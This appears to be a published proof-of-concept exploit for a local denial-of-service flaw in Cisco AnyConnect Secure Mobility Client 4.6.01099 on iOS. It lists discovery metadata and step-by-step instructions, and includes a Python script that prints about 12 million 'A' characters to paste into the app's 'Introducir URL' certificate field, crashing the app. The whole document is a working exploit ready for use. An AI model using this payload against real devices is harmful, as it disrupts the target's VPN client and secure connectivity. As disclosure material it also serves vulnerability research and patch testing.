# Exploit Title: Cisco AnyConnect Secure Mobility Client 4.6.01099 - 'Introducir URL' Denial of Service (PoC)
# Discovery by: Luis Martinez
# Discovery Date: 2018-08-29
# Vendor Homepage: https://www.cisco.com/
# Software Link: App Store for iOS devices
# Tested Version: 4.6.01099
# Vulnerability Type: Denial of Service (DoS) Local
# Tested on OS: iPhone 7 iOS 11.4.1

# Steps to Produce the Crash:
# 1.- Run python code: Cisco_AnyConnect_Secure_Mobility_Client_4.6.01099.py
# 2.- Copy content to clipboard
# 3.- Open App Cisco AnyConnect Secure Mobility Client
# 4.- Diagnosticos
# 5.- Certificados
# 6.- Importar certificado de usuario...
# 7.- Paste ClipBoard on "Introducir URL"
# 8.- Crashed

#!/usr/bin/env python

buffer = "\x41" * 12380000
print (buffer)